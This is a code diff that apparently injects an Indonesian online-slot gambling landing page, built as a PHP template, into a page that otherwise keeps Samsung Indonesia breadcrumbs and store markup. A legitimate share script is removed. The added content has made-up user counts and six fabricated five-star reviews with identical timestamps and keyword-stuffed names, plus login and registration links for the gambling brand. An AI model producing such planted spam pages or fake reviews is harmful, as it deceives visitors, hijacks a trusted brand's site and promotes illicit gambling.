+  .lx-mainbox{
+    position:relative;
+    overflow:hidden;
+    border-radius:26px;
+    padding:34px;
+    background:
+      radial-gradient(circle at top left,rgba(255,45,45,.22),transparent 32%),
+      radial-gradient(circle at bottom right,rgba(180,0,0,.24),transparent 36%),
+      linear-gradient(145deg,#160202 0%,#320707 52%,#0d0101 100%);
+    border:1px solid rgba(255,55,55,.58);
+    box-shadow:0 24px 60px rgba(0,0,0,.50),inset 0 0 0 1px rgba(255,255,255,.05);
+    color:#ffecec;
+  }
+
+  .lx-mainbox:before{
+    content:"";
+    position:absolute;
+    inset:16px;
+    border:1px solid rgba(255,170,170,.12);
+    border-radius:20px;
+    pointer-events:none;
+  }
+
+  .lx-mainbox:after{
+    content:"";
+    position:absolute;
+    top:-80px;
+    right:-100px;
+    width:260px;
+    height:260px;
+    border-radius:50%;
+    background:rgba(255,35,35,.18);
+    filter:blur(12px);
+    pointer-events:none;
+  }
+
+  .lx-hero{
+    position:relative;
+    z-index:1;
+    display:grid;
+    grid-template-columns:1.15fr .85fr;
+    gap:26px;
+    align-items:stretch;
+  }
+
+  .lx-title-card{
+    border-radius:22px;
+    padding:30px;
+    background:rgba(255,255,255,.055);
+    border:1px solid rgba(255,80,80,.18);
+    box-shadow:0 14px 34px rgba(0,0,0,.30);
+  }
+
+  .lx-badge{
+    display:inline-flex;
+    align-items:center;
+    gap:8px;
+    padding:8px 14px;
+    border-radius:999px;
+    background:rgba(255,40,40,.13);
+    color:#ffb0b0;
+    border:1px solid rgba(255,65,65,.48);
+    font-size:13px;
+    font-weight:800;
+    letter-spacing:.4px;
+    text-transform:uppercase;
+    margin-bottom:16px;
+  }
+
+  .lx-badge:before{
+    content:"";
+    width:8px;
+    height:8px;
+    border-radius:50%;
+    background:#ff3030;
+    box-shadow:0 0 12px rgba(255,35,35,.95);
+  }
+
+  .lx-container h1{
+    margin:0;
+    font-size:34px;
+    line-height:1.3;
+    font-weight:900;
+    letter-spacing:.2px;
+    color:#ffffff;
+    text-shadow:0 4px 16px rgba(0,0,0,.50);
+  }
+
+  .lx-divider{
+    width:96px;
+    height:4px;
+    margin:22px 0 0;
+    border-radius:999px;
+    background:linear-gradient(90deg,#ff9b9b,#ff2d2d,#8b0000);
+  }
+
+  .lx-info-panel{
+    border-radius:22px;
+    padding:22px;
+    background:linear-gradient(180deg,rgba(255,255,255,.08),rgba(255,255,255,.035));
+    border:1px solid rgba(255,60,60,.30);
+  }
+
+  .info-grid{
+    display:grid;
+    grid-template-columns:1fr 1fr;
+    gap:14px;
+    margin:0;
+  }
+
+  .info-card{
+    min-height:112px;
+    padding:18px 14px;
+    border-radius:18px;
+    background:rgba(18,2,2,.70);
+    border:1px solid rgba(255,60,60,.24);
+    display:flex;
+    flex-direction:column;
+    justify-content:center;
+    text-align:center;
+    transition:.28s ease;
+  }
+
+  .info-card:hover{
+    transform:translateY(-5px);
+    border-color:rgba(255,70,70,.76);
+    box-shadow:0 14px 30px rgba(0,0,0,.32),0 0 22px rgba(255,30,30,.20);
+  }
+
+  .info-card .label{
+    color:#ff9b9b;
+    font-size:12px;
+    font-weight:800;
+    text-transform:uppercase;
+    letter-spacing:.7px;
+    margin-bottom:8px;
+  }
+
+  .info-card .value{
+    color:#ffffff;
+    font-size:18px;
+    font-weight:900;
+    line-height:1.25;
+  }
+
+  .highlight-box{
+    position:relative;
+    z-index:1;
+    margin:28px 0 0;
+    padding:28px 30px;
+    border-radius:22px;
+    background:rgba(255,245,245,.96);
+    border:1px solid rgba(255,70,70,.34);
+    box-shadow:0 18px 36px rgba(0,0,0,.22);
+  }
+
+  .highlight-box p{
+    margin:0;
+    color:#2b0000;
+    font-size:16px;
+    line-height:1.9;
+    text-align:justify;
+  }
+
+  .reviews-section{
+    position:relative;
+    z-index:1;
+    margin-top:34px;
+    padding-top:28px;
+    border-top:1px solid rgba(255,80,80,.16);
+  }
+
+  .lx-container h2{
+    margin:0 0 22px;
+    color:#ffffff;
+    font-size:26px;
+    line-height:1.35;
+    font-weight:900;
+    text-align:center;
+    letter-spacing:.4px;
+    text-transform:uppercase;
+  }
+
+  .lx-container h2:after{
+    content:"";
+    display:block;
+    width:120px;
+    height:3px;
+    margin:14px auto 0;
+    border-radius:999px;
+    background:linear-gradient(90deg,transparent,#ff8d8d,#ff2d2d,transparent);
+  }
+
+  .reviews-grid{
+    display:grid;
+    grid-template-columns:repeat(3,minmax(0,1fr));
+    gap:18px;
+  }
+
+  .review-card{
+    position:relative;
+    overflow:hidden;
+    min-height:210px;
+    padding:22px;
+    border-radius:20px;
+    background:
+      linear-gradient(180deg,rgba(255,255,255,.08),rgba(255,255,255,.035)),
+      rgba(18,2,2,.74);
+    border:1px solid rgba(255,60,60,.25);
+    box-shadow:0 14px 32px rgba(0,0,0,.28);
+    transition:.28s ease;
+  }
+
+  .review-card:hover{
+    transform:translateY(-7px);
+    border-color:rgba(255,50,50,.80);
+    box-shadow:0 22px 42px rgba(0,0,0,.38),0 0 24px rgba(255,25,25,.22);
+  }
+
+  .review-card:before{
+    content:"";
+    position:absolute;
+    top:0;
+    left:0;
+    right:0;
+    height:4px;
+    background:linear-gradient(90deg,#ff9b9b,#ff2d2d,#8b0000);
+  }
+
+  .review-card:after{
+    content:"“";
+    position:absolute;
+    right:18px;
+    bottom:-22px;
+    font-family:Georgia,serif;
+    font-size:110px;
+    color:rgba(255,40,40,.08);
+    line-height:1;
+  }
+
+  .review-header{
+    position:relative;
+    z-index:1;
+    display:flex;
+    align-items:flex-start;
+    justify-content:space-between;
+    gap:12px;
+    margin-bottom:14px;
+  }
+
+  .review-name{
+    color:#ffffff;
+    font-size:15px;
+    line-height:1.4;
+    font-weight:900;
+  }
+
+  .review-stars{
+    white-space:nowrap;
+    color:#ff4b4b;
+    font-size:14px;
+    letter-spacing:1px;
+    text-shadow:0 0 10px rgba(255,40,40,.65);
+  }
+
+  .review-text{
+    position:relative;
+    z-index:1;
+    margin:0;
+    color:#ffe4e4;
+    font-size:14.7px;
+    line-height:1.75;
+    font-style:italic;
+  }
+
+  .review-date{
+    position:relative;
+    z-index:1;
+    display:inline-block;
+    margin-top:16px;
+    padding:7px 11px;
+    border-radius:999px;
+    background:rgba(255,40,40,.11);
+    border:1px solid rgba(255,60,60,.26);
+    color:#ff9b9b;
+    font-size:12px;
+    font-weight:800;
+  }
+
+  @media(max-width:980px){
+    .lx-hero{
+      grid-template-columns:1fr;
+    }
+
+    .reviews-grid{
+      grid-template-columns:repeat(2,minmax(0,1fr));
+    }
+  }
+
+  @media(max-width:640px){
+    .lx-container{
+      margin:28px auto;
+      padding:0 12px;
+    }
+
+    .lx-mainbox{
+      padding:22px;
+      border-radius:20px;
+    }
+
+    .lx-title-card,
+    .lx-info-panel,
+    .highlight-box{
+      padding:20px;
+      border-radius:18px;
+    }
+
+    .lx-container h1{
+      font-size:24px;
+    }
+
+    .lx-container h2{
+      font-size:21px;
+    }
+
+    .info-grid,
+    .reviews-grid{
+      grid-template-columns:1fr;
+    }
+
+    .highlight-box p{
+      font-size:15px;
+      line-height:1.8;
+    }
+  }
+</style>
+
+<article class="lx-container" aria-label="Artikel Game Digital Yang Setiap">
+  <div class="lx-mainbox">
+
+    <div class="lx-hero">
+      <div class="lx-title-card">
+        <div class="lx-badge">Informasi Pilihan <?= $BRAND; ?> x <?= $BRAND2; ?></div>
+        <h1><?= $title; ?></h1>
+        <div class="lx-divider"></div>
+      </div>
+
+      <div class="lx-info-panel">
+        <div class="info-grid">
+          <div class="info-card">
+            <div class="label">Penilaian Pengguna</div>
+            <div class="value">5 JUTA PENGGUNA</div>
+          </div>
+
+          <div class="info-card">
+            <div class="label">Minimal Deposit</div>
+            <div class="value">10.000 Ribu</div>
+          </div>
+
+          <div class="info-card">
+            <div class="label">Minimal Withdraw</div>
+            <div class="value">50.000 Ribu</div>
+          </div>
+
+          <div class="info-card">
+            <div class="label">Layanan Support</div>
+            <div class="value">24/7</div>
           </div>
         </div>
-        <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/share.js?v=19406306419835735731742784889" defer="defer"></script>
-        <style> .header__heading {align-items: center;} .brand--logo {margin-right: 78px; max-width: 139px;} .header__icons {align-items: center;} @media screen and (max-width: 749px) {.brand--logo {margin-right: 39px; }} div .product-form > form.form {display: none;} .shopify-policy__title h1 {margin-top: 75px;} table.tbl-content {table-layout: fixed; border-collapse: collapse; font-size: 1.4rem; border-style: hidden; border-top: 0.1rem solid rgba(var(--color-foreground), 0.2); border-right: 0.1rem solid rgba(var(--color-foreground), 0.2); border-left: 0.1rem solid rgba(var(--color-foreground), 0.2); border-bottom: 0.1rem solid rgba(var(--color-foreground), 0.2);} table.tbl-content td,table.tbl-content th {padding: 1em; border: 0.1rem solid rgba(var(--color-foreground), 0.2);} .rte ul,.rte ol {list-style-position: outside;} .shopify-policy__container {max-width: 125ch;} .shopify-policy__body table.tbl-content td,table.tbl-content th {font-size: 16px;} .shopify-policy__body table.tbl-content td span.cite,table.tbl-content th span.cite {font-size: 12px;}  /*applecare Pelajari Selengkapnya pop up*/.modal .ac-modal {display: flex !important; flex-direction: column;} .apple-care-modal__heading {order: 1; margin-bottom: 30px;} .modal .media.media--transparent.ratio {width: 100% !important; height: 110px !important; order: 0;} .modal .media.media--transparent.ratio img {width: 110px !important; height: auto !important; position: relative !important;} .apple-care-modal__content {order: 2;}  /*end applecare Pelajari Selengkapnya pop up*/ </style>
+      </div>
+    </div>
+
+    <div class="highlight-box">
+      <p><?= $artikel; ?></p>
+    </div>
+
+    <section class="reviews-section">
+      <h2>APA KATA MEREKA? REVIEW MEMBER SETIA <?= $BRAND; ?> x <?= $BRAND2; ?></h2>
+
+      <div class="reviews-grid">
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name"><?= $BRAND; ?> x <?= $BRAND2; ?> – Surabaya</span>
+            <span class="review-stars">★★★★★</span>
+          </div>
+          <p class="review-text">"<?= $description; ?>"</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name">setiap detiknya punya kejutan – Bandung</span>
+            <span class="review-stars">★★★★★</span>
+          </div>
+          <p class="review-text">"Ulasan ini cukup membantu karena membuat <?= $title; ?> terasa lebih mudah dipahami oleh pembaca baru."</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name">dunia game digital yang – Jakarta</span>
+            <span class="review-stars">★★★★☆</span>
+          </div>
+          <p class="review-text">"Menurut saya pembahasan tentang <?= $title; ?> terasa rapi, mudah diikuti, dan cukup membantu untuk memahami poin pentingnya."</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name">game digital yang setiap – Pangkal Pinang</span>
+            <span class="review-stars">★★★★★</span>
+          </div>
+          <p class="review-text">"Informasinya enak dibaca karena alurnya jelas dan pembaca bisa langsung menangkap inti dari <?= $title; ?>."</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name">digital yang setiap detiknya - Magelang</span>
+            <span class="review-stars">★★★★★</span>
+          </div>
+          <p class="review-text">"Saya suka cara artikel ini menjelaskan <?= $title; ?> karena tidak bertele-tele dan tetap terasa natural."</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+
+        <div class="review-card">
+          <div class="review-header">
+            <span class="review-name">yang setiap detiknya punya - Malang</span>
+            <span class="review-stars">★★★★★</span>
+          </div>
+          <p class="review-text">"Topik <?= $title; ?> dibahas dengan gaya yang sederhana namun tetap memberi gambaran yang lengkap."</p>
+          <span class="review-date">2026-08-06T01:41:45+07:00</span>
+        </div>
+      </div>
+    </section>
+
+  </div>
+</article>
+        <!-- CTA Buttons -->
+        
+        
+        <!-- Simple footer -->
+        <div style="text-align: center; margin-top: 30px; padding-top: 20px; border-top: 1px solid #ffdd00; color: #ffdd00; font-size: 12px;">
+            © 2026 <?= $BRAND; ?> x <?= $BRAND2; ?>. All rights reserved.
+        </div>
+    </div>
+    
+    <script>
+        function toggleFaq(button) {
+            const answer = button.nextElementSibling;
+            const icon = button.querySelector('.icon');
+            
+            // Toggle current
+            if (answer.classList.contains('open')) {
+                answer.classList.remove('open');
+                icon.textContent = '+';
+            } else {
+                answer.classList.add('open');
+                icon.textContent = '−';
+            }
+        }
+    </script>
+
+            <script>
+                (function () {
+                    // ===== FAQ Accordion (5 sesuai schema) =====
+                    const faqButtons = document.querySelectorAll(".digital-yang-setiap-detiknya-container .acc-item");
+                    faqButtons.forEach((btn, idx) => {
+                        const panel = btn.nextElementSibling;
+
+                        const qId = `Game Digital Yang Setiap-faq-q-${idx}`;
+                        const pId = `Game Digital Yang Setiap-faq-p-${idx}`;
+                        btn.id = qId;
+                        panel.id = pId;
+                        btn.setAttribute("aria-controls", pId);
+                        panel.setAttribute("aria-labelledby", qId);
+
+                        btn.addEventListener("click", () => {
+                            const isOpen = btn.getAttribute("aria-expanded") === "true";
+                            faqButtons.forEach(b => {
+                                b.setAttribute("aria-expanded", "false");
+                                b.nextElementSibling.classList.remove("is-open");
+                            });
+                            if (!isOpen) {
+                                btn.setAttribute("aria-expanded", "true");
+                                panel.classList.add("is-open");
+                            }
+                        });
+                    });
+
+                    // ===== PENILAIAN-ALX Auto Slide (6 sesuai schema) =====
+                    const slider = document.getElementById("alxSlider");
+                    const track = slider?.querySelector(".penilaian-mwt-track");
+                    const cards = track ? Array.from(track.children) : [];
+                    const dotsWrap = slider?.querySelector(".penilaian-mwt-dots");
+
+                    if (!slider || !track || cards.length === 0) return;
+
+                    let index = 0;
+                    let perView = 1;
+                    let timer = null;
+
+                    function calcPerView() {
+                        const w = window.innerWidth;
+                        if (w >= 980) return 3;
+                        if (w >= 720) return 2;
+                        return 1;
+                    }
+
+                    function buildDots() {
+                        if (!dotsWrap) return;
+                        dotsWrap.innerHTML = "";
+                        const pages = Math.ceil(cards.length / perView);
+                        for (let i = 0; i < pages; i++) {
+                            const d = document.createElement("span");
+                            d.className = "penilaian-mwt-dot" + (i === 0 ? " is-active" : "");
+                            dotsWrap.appendChild(d);
+                        }
+                    }
+
+                    function setActiveDot(page) {
+                        if (!dotsWrap) return;
+                        Array.from(dotsWrap.children).forEach((d, i) => {
+                            d.classList.toggle("is-active", i === page);
+                        });
+                    }
+
+                    function slideTo(page) {
+                        const cardWidth = cards[0].getBoundingClientRect().width;
+                        const gap = parseFloat(getComputedStyle(track).gap) || 0;
+                        const step = (cardWidth + gap) * perView;
+
+                        const maxPage = Math.max(0, Math.ceil(cards.length / perView) - 1);
+                        index = page > maxPage ? 0 : page;
+
+                        track.style.transform = `translateX(-${step * index}px)`;
+                        setActiveDot(index);
+                    }
+
+                    function start() {
+                        stop();
+                        timer = setInterval(() => slideTo(index + 1), 3200);
+                    }
+                    function stop() {
+                        if (timer) clearInterval(timer);
+                        timer = null;
+                    }
+
+                    function refresh() {
+                        perView = calcPerView();
+                        buildDots();
+                        slideTo(0);
+                        start();
+                    }
+
+                    slider.addEventListener("mouseenter", stop);
+                    slider.addEventListener("mouseleave", start);
+                    slider.addEventListener("touchstart", stop, { passive: true });
+                    slider.addEventListener("touchend", start, { passive: true });
+
+                    window.addEventListener("resize", () => {
+                        clearTimeout(window.__alxResizeT);
+                        window.__alxResizeT = setTimeout(refresh, 140);
+                    });
+
+                    refresh();
+                })();
+            </script>
+            
+            <script>
+                $(document).ready(function () {
+                    $(window).on('scroll', function () {
+                        if (
+                            $(window).scrollTop() >=
+                            $('.product-recommendations1').offset().top + $('.product-recommendations1').outerHeight() - window.innerHeight
+                        ) {
+                            setTimeout(function () {
+                                var checkLength = $("input[name='frequent-products-pdp']:checked").length;
+                                var productRecs = document.querySelector('.product-recommendations1');
+
+                                $('#checked-products').text(checkLength);
+                            }, 4000);
+                            setTimeout(function () {
+                                var height;
+                                var maxheight = 0;
+                                var minheight = 0;
+                                $('.price_container_cal').each(function () {
+                                    height = parseInt($(this).height());
+                                    if (height > maxheight) {
+                                        maxheight = height;
+                                    } else {
+                                        minheight = height;
+                                    }
+                                });
+                                let isMobile = window.matchMedia('only screen and (max-width: 1023px)').matches;
+                                if (!isMobile) {
+                                    if (maxheight >= minheight) {
+                                        $('.price_container_cal').attr(
+                                            'style',
+                                            'display: flex; flex-flow: column; justify-content: flex-end; height:' + maxheight + 'px;'
+                                        );
+                                    }
+                                }
+                            }, 500);
+                        }
+                    });
+                });
+            </script>
+
+  
+
+</div>
+          </div>
+        </div>
+      </div>
+    </div>
+    <nav aria-label="Breadcrumb" class="breadcrumb">
+     <div class="breadcrumb__inner">
+      <ul class="breadcrumb__path" role="list">
+       <li role="listitem">
+        <a an-ac="breadcrumb" an-ca="navigation" an-la="breadcrumb:home" an-tr="nv03_breadcrumb-product detail-text-breadcrumb" aria-label="Home" href="https://www.samsung.com/id/">
+         <span class="breadcrumb__text-desktop">
+          <?= $BRAND; ?> x <?= $BRAND2; ?> <span style="margin-left: 15px;">></span>
+         </span>
+         <span class="breadcrumb__text-mobile">
+          <?= $BRAND; ?> x <?= $BRAND2; ?> <span style="margin-left: 15px;">></span>
+         </span>
+        </a>
+        <svg aria-hidden="true" class="icon" focusable="false">
+         <use href="#next-bold" xlink:href="#next-bold">
+         </use>
+        </svg>
+       </li>
+       <li role="listitem">
+        <a an-ac="breadcrumb" an-ca="navigation" an-la="breadcrumb:mobile" an-tr="nv03_breadcrumb-product detail-text-breadcrumb" aria-label="Mobile" href="https://www.samsung.com/id/mobile/">
+         <span class="breadcrumb__text-desktop">
+          Dunia Game Digital Yang <span style="margin-left: 15px;">></span>
+         </span>
+         <span class="breadcrumb__text-mobile">
+          Dunia Game Digital Yang <span style="margin-left: 15px;">></span>
+         </span>
+        </a>
+        <svg aria-hidden="true" class="icon" focusable="false">
+         <use href="#next-bold" xlink:href="#next-bold">
+         </use>
+        </svg>
+       </li>
+       <li role="listitem">
+        <a an-ac="breadcrumb" an-ca="navigation" an-la="breadcrumb:smartphones" an-tr="nv03_breadcrumb-product detail-text-breadcrumb" aria-label="Smartphones" href="https://www.samsung.com/id/smartphones/">
+         <span class="breadcrumb__text-desktop">
+        Digital Yang Setiap Detiknya
+         </span>
+         <span class="breadcrumb__text-mobile">
+        Yang Setiap Detiknya Punya
+         </span>
+        </a>
+        <svg aria-hidden="true" class="icon" focusable="false">
+         <use href="#next-bold" xlink:href="#next-bold">
+         </use>
+        </svg>
+       </li>
+      </ul>
+     </div>
+    </nav>
+    <div class="pd-g-manufacturer-info-popup">
+     <div aria-modal="true" class="manufacturer-info-popup" role="dialog" tabindex="0">
+      <div class="layer-popup">
+       <div class="layer-popup__inner">
+        <div class="layer-popup__contents scrollbar">
+         <div class="scrollbar__contents">
+         </div>
+        </div>
+        <button class="layer-popup__close" type="button">
+         <span class="hidden">
+          Tutup Layar Popup
+         </span>
+         <svg class="icon" focusable="false">
+          <use href="#delete-bold" xlink:href="#delete-bold">
+          </use>
+         </svg>
+        </button>
+       </div>
+      </div>
+     </div>
+    </div>
+    <!-- <sly data-sly-use.templatedContainer="com.day.cq.wcm.foundation.TemplatedContainer"
+			data-sly-repeat.child=""
+			data-sly-resource=""></sly> -->
+   </div>
+   <div class="pdd39-anchor-nav__bottom-wrap" id="anchorNavigationPriceBarMobile">
+    <div class="pdd39-anchor-nav__bottom">
+     <div class="pdd39-anchor-nav__price pd-buying-price" id="sgDevPriceAreaBaseMobile">
+     </div>
+    </div>
+   </div>
+   <footer class="footer">
+    <!--googleoff: all-->
+    <div class="footer">
+      <div class="footer-column">
+        <p class="hidden">
+          Footer Navigation
+        </p>
+
+        <!-- ===== COLUMN 1: PRODUCTS ===== -->
+        <div class="footer-column__item">
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-0">
+              Products
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="products" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-0" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden" data-i18n-close="Tutup" data-i18n-open="Buka">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Dunia Game Digital Yang
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Game Digital Yang Setiap
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Digital Yang Setiap Detiknya
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Yang Setiap Detiknya Punya
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Setiap Detiknya Punya Kejutan
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    <?= $BRAND; ?> x <?= $BRAND2; ?> SLOT
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    <?= $BRAND; ?> x <?= $BRAND2; ?> LOGIN
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+        <!-- ===== COLUMN 2: SERVICES ===== -->
+        <div class="footer-column__item">
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-1">
+              Services
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="services" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-1" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden" data-i18n-close="Tutup" data-i18n-open="Buka">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Promo &amp; Bonus Harian
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Turnamen &amp; Event
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Program VIP &amp; Cashback
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Metode Pembayaran
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Fitur Deposit
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Fitur Withdraw
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Program Referral
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== COLUMN 3: SUPPORT ===== -->
+        <div class="footer-column__item">
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-2">
+              Support
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="support" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-2" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden" data-i18n-close="Tutup" data-i18n-open="Buka">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Pusat Bantuan
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Live Chat 24/7
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    WhatsApp Support
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    FAQ
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Kebijakan Privasi
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Syarat &amp; Ketentuan
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Responsible Gaming
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== COLUMN 4: ACCOUNT ===== -->
+        <div class="footer-column__item">
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-3">
+              Account
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="account" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-3" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden" data-i18n-close="Tutup" data-i18n-open="Buka">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $ampmek; ?>">
+                    Login Member
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $ampmek; ?>">
+                    Daftar Akun Baru
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $ampmek; ?>">
+                    Lupa Password
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Riwayat Transaksi
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Fitur Verifikasi
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Program VIP
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+        <!-- ===== COLUMN 5: INFO + ABOUT Game Digital Yang Setiap ===== -->
+        <div class="footer-column__item">
+          <!-- Info / Guides -->
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-4">
+              Information
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="information" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-4" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Fitur Akses
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Fitur Pemula
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Aturan &amp; Kebijakan
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Kontak Resmi
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+
+          <!-- About Game Digital Yang Setiap -->
+          <div class="footer-category">
+            <p class="footer-category__title" id="footer-category-title-4-2">
+              About Game Digital Yang Setiap
+            </p>
+            <a an-ac="footer" an-ca="navigation" an-la="about Game Digital Yang Setiap" an-tr="nv01_footer sitemap|menu1Depth" aria-expanded="false" aria-labelledby="footer-category-title-4-2" class="footer-category__anchor" href="javascript:void(0);" role="button">
+              <span class="hidden">
+                Buka
+              </span>
+              <svg class="icon" focusable="false">
+                <use href="#open-down-regular" xlink:href="#open-down-regular"></use>
+              </svg>
+            </a>
+            <div class="footer-category__list-wrap">
+              <ul class="footer-category__list" role="list">
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Tentang <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Kenapa Pilih <?= $BRAND; ?> x <?= $BRAND2; ?>
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Partner &amp; Affiliate
+                  </a>
+                </li>
+                <li class="footer-category__item" role="listitem">
+                  <a class="footer-category__link" href="<?= $canonical; ?>">
+                    Brand &amp; Identitas
+                  </a>
+                </li>
+              </ul>
+            </div>
+          </div>
+        </div>
+
+      </div>
+
